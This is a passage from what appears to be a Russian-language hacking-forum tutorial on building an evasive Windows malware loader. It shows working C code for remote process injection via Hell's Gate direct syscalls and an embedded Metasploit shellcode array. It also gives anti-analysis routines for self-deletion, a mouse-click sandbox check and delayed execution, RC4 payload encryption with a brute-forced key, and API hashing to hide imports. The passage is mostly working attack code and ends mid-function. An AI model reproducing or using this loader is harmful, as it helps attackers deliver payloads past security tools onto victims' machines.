        return FALSE;
    }
    printf(&quot;[+] Готово \n&quot;);
    printf(&quot;\t[+] Создан поток с идентификатором : %d \n&quot;, GetThreadId(hThread));

    //--------------------------------------------------------------------------
    // Ожидание завершения потока
    HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
    if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
        printf(&quot;[!] NtWaitForSingleObject не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Отмена отображения локального вида
    HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    HellsGate(g_Sys.NtClose.wSystemCall);
    if ((STATUS = HellDescent(hSection)) != 0) {
        printf(&quot;[!] NtClose не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Перечисление процессов</b><br />
<br />
Для создания полного модуля внедрения в процесс необходимо использовать системный вызов NtQuerySystemInformation для получения дескриптора целевого процесса, как описано в модуле Process Enumeration - NtQuerySystemInformation.<br />
<br />
Использование нового системного вызова потребует обновления структуры VX_TABLE, чтобы включить еще один элемент, VX_TABLE_ENTRY.<br />
NtQuerySystemInformation, который будет инициализирован функцией InitializeSyscalls. Кроме того, используйте программу Hasher для вычисления хеш-значения для строки &quot;NtQuerySystemInformation&quot;.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

    ULONG                        uReturnLen1         = NULL,
                                uReturnLen2         = NULL;
    PSYSTEM_PROCESS_INFORMATION  SystemProcInfo     = NULL;
    PVOID                        pValueToFree     = NULL;
    NTSTATUS                    STATUS             = NULL;

    // Это неудача со статусом = STATUS_INFO_LENGTH_MISMATCH, но это нормально, потому что нам нужно узнать, сколько нужно выделить (uReturnLen1)
    HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
    HellDescent(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);

    // Выделение достаточного буфера для возвращаемого массива структур SYSTEM_PROCESS_INFORMATION
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) {
        return FALSE;
    }

    // Поскольку мы будем изменять &#039;SystemProcInfo&#039;, мы сохраняем его начальное значение перед циклом while, чтобы позже освободить его
    pValueToFree = SystemProcInfo;

    // Вызов NtQuerySystemInformation с правильными аргументами, вывод будет сохранен в &#039;SystemProcInfo&#039;
    HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
    STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
    if (STATUS != 0x0) {
        printf(&quot;[!] NtQuerySystemInformation не удалось с ошибкой : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    while (TRUE) {

        // Проверка размера имени процесса
        // Сравнение имени процесса с целью
        if (SystemProcInfo-&gt;ImageName.Length &amp;&amp; HASHW(SystemProcInfo-&gt;ImageName.Buffer) == HASHW(szProcName)) {
            // Открытие дескриптора целевого процесса и сохранение его, затем выход
            *pdwPid = (DWORD)SystemProcInfo-&gt;UniqueProcessId;
            *phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo-&gt;UniqueProcessId);
            break;
        }

        // Если NextEntryOffset равен 0, мы достигли конца массива
        if (!SystemProcInfo-&gt;NextEntryOffset)
            break;

        // Переход к следующему элементу в массиве
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);
    }

    // Освобождение памяти, используя начальный адрес
    HeapFree(GetProcessHeap(), 0, pValueToFree);

    // Проверка, получен ли дескриптор целевого процесса
    if (*pdwPid == NULL || *phProcess == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Основная функция</b><br />
<br />
Для тестирования кода создайте main.c, который будет содержать точку входа загрузчика, а также обычную полезную нагрузку Msfvenom calc.<br />
<br />
<b>Объяснение что делается в основной функции:</b><br />
<br />
Функция InitializeSyscalls - это первая вызываемая функция.<br />
Все остальные функции зависят от нее для инициализации структуры системных вызовов.<br />
Если TARGET_PROCESS определен, вызывается функция GetRemoteProcessHandle для получения дескриптора целевого процесса и передачи его вывода в RemoteMappingInjectionViaSyscalls. Если TARGET_PROCESS не определен, код непосредственно вызывает RemoteMappingInjectionViaSyscalls с псевдо-значением для дескриптора локального процесса (1), указывая внедрить полезную нагрузку локально.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;// комментарий для внедрения в локальный процесс
//
#define TARGET_PROCESS    L&quot;Notepad.exe&quot;// x64 calc metasploit
unsigned char Payload [] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x20, 0x2F, 0x69, 0x20, 0x2F,
    0x74, 0x31, 0x20, 0x2F, 0x64, 0x65, 0x6C, 0x20, 0x22, 0x25, 0x50, 0x52,
    0x4F, 0x47, 0x52, 0x41, 0x4D, 0x46, 0x49, 0x4C, 0x45, 0x25, 0x22, 0x00,
    0x00
};
// Вторичный поток
DWORD WINAPI MainThread(LPVOID lpParam) {
    UNREFERENCED_PARAMETER(lpParam);

    printf(&quot;\n\n[~] Запущено \n&quot;);

    // Инициализация системных вызовов
    if (!InitializeSyscalls()) {
        printf(&quot;[!] Не удалось инициализировать системные вызовы \n&quot;);
        return FALSE;
    }

    // Получение дескриптора целевого процесса
    HANDLE hProcess = NULL;
    DWORD dwPid = NULL;
    if (TARGET_PROCESS) {
        if (!GetRemoteProcessHandle(TARGET_PROCESS, &amp;dwPid, &amp;hProcess)) {
            printf(&quot;[!] Не удалось получить дескриптор целевого процесса \n&quot;);
            return FALSE;
        }
        printf(&quot;[+] Дескриптор целевого процесса получен : %d \n&quot;, dwPid);
    }
    else {
        hProcess = (HANDLE)1; // Псевдо-дескриптор для локальной инъекции
    }

    // Выполнение внедрения
    if (!RemoteMappingInjectionViaSyscalls(hProcess, Payload, sizeof(Payload), !TARGET_PROCESS)) {
        printf(&quot;[!] Внедрение Payload не удалось \n&quot;);
        return FALSE;
    }

    printf(&quot;[+] Выполнено \n&quot;);

    // Ожидание завершения
    if (TARGET_PROCESS) {
        WaitForSingleObject(hProcess, INFINITE);
    }

    return TRUE;
}
int main() {
    HANDLE hThread = CreateThread(NULL, 0, MainThread, NULL, 0, NULL);
    if (hThread == NULL) {
        printf(&quot;[!] Не удалось создать поток \n&quot;);
        return 1;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}</code></pre>
	</div>
</div><br />
<b>Результаты:<br />
<br />
Удаленная инъекция</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788183250.png"
		data-src="https://osint42.org/attachments/1746788183250-png.263/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788183250-png.263/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788183250.png"
			title="1746788183250.png"
			width="1656" height="743" loading="lazy" />
	</div><br />
<br />
<br />
<b>Локальная инъекция</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788190362.png"
		data-src="https://osint42.org/attachments/1746788190362-png.264/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788190362-png.264/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788190362.png"
			title="1746788190362.png"
			width="1729" height="756" loading="lazy" />
	</div><br />
<br />
<b>Функции антианализа </b><br />
<br />
Для добавления функций антианализа создайте новый файл с именем AntiAnalysis.c. Этот файл будет содержать следующую функциональность:<br />
<ol>
<li data-xf-list-type="ol">Функция самоудаления.</li>
<li data-xf-list-type="ol">Функция мониторинга щелчков мыши.</li>
<li data-xf-list-type="ol">Функция задержки выполнения с использованием NtDelayExecution.</li>
</ol><b>AntiAnalysis.c</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

// Глобальные переменные для хука
HHOOK g_hMouseHook = NULL;
DWORD g_dwMouseClicks = NULL;

// Callback-функция, которая будет выполняться при каждом клике мыши
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        printf(&quot;[+] Запись клика мыши\n&quot;);
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG Msg = { 0 };

    // Установка хука
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW не удалось с ошибкой: %d\n&quot;, GetLastError());
    }

    // Обработка необработанных событий
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}

BOOL DeleteSelf() {

    WCHAR szPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO Delete = { 0 };
    HANDLE hFile = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO pRename = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

    // Выделение достаточного буфера для структуры &#039;FILE_RENAME_INFO&#039;
    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        printf(&quot;[!] HeapAlloc не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    // Очистка структур
    ZeroMemory(szPath, sizeof(szPath));
    ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));

    // Маркировка файла для удаления (используется во втором вызове SetFileInformationByHandle)
    Delete.DeleteFile = TRUE;

    // Установка имени нового потока данных и его размера в структуре &#039;FILE_RENAME_INFO&#039;
    pRename-&gt;FileNameLength = sizeof(NewStream);
    RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));

    // Получение имени текущего файла
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
        printf(&quot;[!] GetModuleFileNameW не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    // Открытие дескриптора текущего файла
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf(&quot;[!] CreateFileW [R] не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    wprintf(L&quot;[i] Переименование :$DATA в %s  ...&quot;, NEW_STREAM);

    // Переименование потока данных
    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
        printf(&quot;[!] SetFileInformationByHandle [R] не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }
    wprintf(L&quot;[+] ГОТОВО\n&quot;);

    CloseHandle(hFile);

    // Открытие нового дескриптора текущего файла
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE &amp;&amp; GetLastError() == ERROR_FILE_NOT_FOUND) {
        // Если файл уже удален
        return TRUE;
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        printf(&quot;[!] CreateFileW [D] не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    wprintf(L&quot;[i] УДАЛЕНИЕ ...&quot;);

    // Маркировка для удаления после закрытия дескриптора файла
    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &amp;Delete, sizeof(Delete))) {
        printf(&quot;[!] SetFileInformationByHandle [D] не удалось с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }
    wprintf(L&quot;[+] ГОТОВО\n&quot;);

    CloseHandle(hFile);

    // Освобождение выделенного буфера
    HeapFree(GetProcessHeap(), 0, pRename);

    return TRUE;
}

typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval
    );

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

    // Преобразование минут в миллисекунды
    DWORD dwMilliSeconds = ftMinutes * 60000;
    LARGE_INTEGER DelayInterval = { 0 };
    LONGLONG Delay = NULL;
    NTSTATUS STATUS = NULL;
    fnNtDelayExecution pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtDelayExecution&quot;);
    DWORD _T0 = NULL;
    DWORD _T1 = NULL;

    printf(&quot;[i] Задержка выполнения с использованием \&quot;NtDelayExecution\&quot; на %0.3d секунд&quot;, (dwMilliSeconds / 1000));

    // Преобразование из миллисекунд в 100-наносекундные интервалы времени (отрицательные)
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    _T0 = GetTickCount64();

    // Пауза на &#039;dwMilliSeconds&#039; мс
    if ((STATUS = pNtDelayExecution(FALSE, &amp;DelayInterval)) != 0x00 &amp;&amp; STATUS != STATUS_TIMEOUT) {
        printf(&quot;[!] NtDelayExecution не удалось с ошибкой: 0x%0.8X\n&quot;, STATUS);
        return FALSE;
    }

    _T1 = GetTickCount64();

    // Если прошло по крайней мере &#039;dwMilliSeconds&#039; мс, то &#039;DelayExecutionVia_NtDE&#039; успешно, в противном случае неудача
    if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
        return FALSE;

    printf(&quot;\n\t&gt;&gt; _T1 - _T0 = %d\n&quot;, (DWORD)(_T1 - _T0));

    printf(&quot;[+] ГОТОВО\n&quot;);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Функция AntiAnalysis</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// using the &#039;extern&#039; keyword, because this variable is already defined in the &#039;Inject.c&#039; file
extern VX_TABLE g_Sys;

//...

BOOL AntiAnalysis(DWORD dwMilliSeconds) {

    HANDLE                    hThread            = NULL;
    NTSTATUS                STATUS            = NULL;
    LARGE_INTEGER            DelayInterval    = { 0 };
    FLOAT                    i                = 1;
    LONGLONG                Delay            = NULL;

    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    // Self-deletion
    if (!DeleteSelf()) {
        // we dont care for the result - but you can change this if you want
    }

    // Try 10 times, after that return FALSE
    while (i &lt;= 10) {

        printf(&quot;[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n&quot;, (dwMilliSeconds / 1000));

        // Creating a thread that runs &#039;MouseClicksLogger&#039; function
        HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
        if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
            printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
        }

        // Waiting for the thread for &#039;dwMilliSeconds&#039;
        HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
        if ((STATUS = HellDescent(hThread, FALSE, &amp;DelayInterval)) != 0 &amp;&amp; STATUS != STATUS_TIMEOUT) {
            printf(&quot;[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
        }

        HellsGate(g_Sys.NtClose.wSystemCall);
        if ((STATUS = HellDescent(hThread)) != 0) {
            printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
        }

        // Unhooking
        if (g_hMouseHook &amp;&amp; !UnhookWindowsHookEx(g_hMouseHook)) {
            printf(&quot;[!] UnhookWindowsHookEx Failed With Error : %d \n&quot;, GetLastError());
            return FALSE;
        }

        // Delaying execution for specific amount of time
        if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
            return FALSE;

        // If the user clicked more than 5 times, we return true
        if (g_dwMouseClicks &gt; 5)
            return TRUE;

        // If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
        g_dwMouseClicks = NULL;

        // Increment &#039;i&#039;, so that next time &#039;DelayExecutionVia_NtDE&#039; will wait longer
        i++;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Кратко о функции AntiAnalysis: </b><br />
<br />
1. Она принимает dwMilliSeconds в качестве входного параметра, который представляет собой количество времени для мониторинга кликов мыши.<br />
<br />
2. Эта функция начинает с вызова DeleteSelf для удаления файла с диска.<br />
<br />
3. Затем запускается цикл while, который запускает MouseClicksLogger через новый поток и ждет его в течение времени, указанного в dwMilliSeconds.<br />
<br />
4. После истечения времени потока хуки удаляются, и выполнение программы задерживается на половину значения переменной i, где i представляет собой значение для задержки выполнения в минутах.<br />
<br />
5. Затем функция проверяет общее количество кликов мыши перед задержкой. Если их меньше 5, то глобальная переменная монитора кликов мыши, g_dwMouseClicks, сбрасывается, чтобы следующий цикл начал тестирование кликов мыши сначала.<br />
<br />
6. Увеличение переменной i заставляет последующую функцию DelayExecutionVia_NtDE ждать дольше, создавая способ задержки выполнения в песочнице.<br />
<br />
common.h<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Название нового потока данных
#define NEW_STREAM L&quot;:RuSfera&quot;

BOOL AntiAnalysis(DWORD dwMilliSeconds);</code></pre>
	</div>
</div><br />
Main.c:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (!AntiAnalysis(20000)) {
    printf(&quot;[!] Обнаружена виртуальная среда\n&quot;);
}</code></pre>
	</div>
</div><br />
Здесь 20000 представляет собой время мониторинга кликов мыши в миллисекундах.<br />
<br />
<b>NtDelayExecution через Hell&#039;s Gate </b><br />
<br />
Hell&#039;s Gate можно использовать для вызова NtDelayExecution, что требует обновления определения структуры VX_TABLE, расположенной в Common.h, и функции InitializeSyscalls для добавления элемента VX_TABLE_ENTRY NtDelayExecution и его инициализации. Программе Hasher также потребуется использование для вычисления хеша для системного вызова, как это было сделано в предыдущих шагах.<br />
<br />
<b>Результаты анти-анализа</b><br />
<br />
На следующем изображении показан результат выполнения функции AntiAnalysis во время выполнения.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788224836.png"
		data-src="https://osint42.org/attachments/1746788224836-png.265/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788224836-png.265/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788224836.png"
			title="1746788224836.png"
			width="1461" height="817" loading="lazy" />
	</div><br />
<br />
<b>Шифрование полезной нагрузки</b><br />
<br />
Для шифрования полезной нагрузки будет использован файл HellShell.exe. Команда, которая будет использоваться, - это .\HellShell.exe calc.bin rc4, где calc.bin - это файл с необработанной полезной нагрузкой. Зашифрованная полезная нагрузка заменит предыдущую нешифрованную полезную нагрузку в файле main.c.<br />
<br />
Кроме того, функция Rc4EncryptionViSystemFunc032, которая отвечает за расшифровку, будет сохранена в файле Inject.c.<br />
<br />
<b>Взлом методом перебора</b><br />
<br />
HellShell.exe генерирует следующий ключ.<br />
<br />
unsigned char Rc4Key[] = { 0x61, 0x1A, 0xA0, 0xAA, 0xA7, 0x92, 0x9F, 0xBA, 0x8F, 0xCE, 0x4C, 0xD8, 0x11, 0xFA, 0xED, 0xB9 };<br />
<br />
Ключ будет зашифрован, а затем расшифрован с использованием метода перебора. Сначала ключ нужно зашифровать. Это будет сделано с помощью нового проекта.<br />
Этот новый проект предоставлен в коде данного модуля и называется KeyGuard2.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788237738.png"
		data-src="https://osint42.org/attachments/1746788237738-png.266/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788237738-png.266/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788237738.png"
			title="1746788237738.png"
			width="1515" height="1000" loading="lazy" />
	</div><br />
<br />
Функция Rc4EncryptionViSystemFunc032 будет обновлена, чтобы включить логику метода перебора. Эта функция будет вызываться из RemoteMappingInjectionViaSyscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // Результат SystemFunction032
    NTSTATUS STATUS = NULL;
    BYTE RealKey[KEY_SIZE] = { 0 };
    int b = 0;

    // Перебор ключа:
    while (1) {
        // Используя намек байта, если это равно, то мы нашли значение &#039;b&#039;, необходимое для расшифровки ключа
        if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
            break;
        // В противном случае увеличиваем &#039;b&#039; и пытаемся снова
        else
            b++;
    }

    printf(&quot;[i] Рассчитанное значение &#039;b&#039; : 0x%0.2X \n&quot;, b);

    // Расшифровка ключа
    for (int i = 0; i &lt; KEY_SIZE; i++) {
        RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
    }

    // Создание 2 переменных типа USTRING, одна передается в качестве ключа, а другая - в качестве блока данных для шифрования/расшифровки
    USTRING Key = { .Buffer = RealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },
            Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };


    // Поскольку функция SystemFunction032 экспортируется из Advapi32.dll, мы загружаем ее в процесс с помощью Advapi32,
    // И используем ее возвращаемое значение в качестве параметра hModule в GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);

    // Если вызовы SystemFunction032 завершаются неудачно, они вернут ненулевое значение
    if ((STATUS = SystemFunction032(&amp;Img, &amp;Key)) != 0x0) {
        printf(&quot;[!] ОШИБКА SystemFunction032 : 0x%0.8X\n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}
}</code></pre>
	</div>
</div><br />
<b>Результаты взлома методом перебора</b><br />
<br />
Выполнение полезной нагрузки (функции анти-анализа отключены).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788250754.png"
		data-src="https://osint42.org/attachments/1746788250754-png.267/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788250754-png.267/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788250754.png"
			title="1746788250754.png"
			width="1604" height="580" loading="lazy" />
	</div><br />
<br />
<b>Хэширование API</b><br />
<br />
До сих пор все использованные WinAPI вызывались напрямую, что означает, что их можно найти в IAT реализации. Чтобы решить эту проблему, создается новый файл, ApiHashing.c, который содержит необходимые функции для реализации хэширования API.<br />
<br />
ApiHashing.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

    if (hModule == NULL || dwApiNameHash == NULL)
        return NULL;

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER       pImgDosHdr       = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS       pImgNtHdrs       = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER   ImgOptHdr        = pImgNtHdrs-&gt;OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir    = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

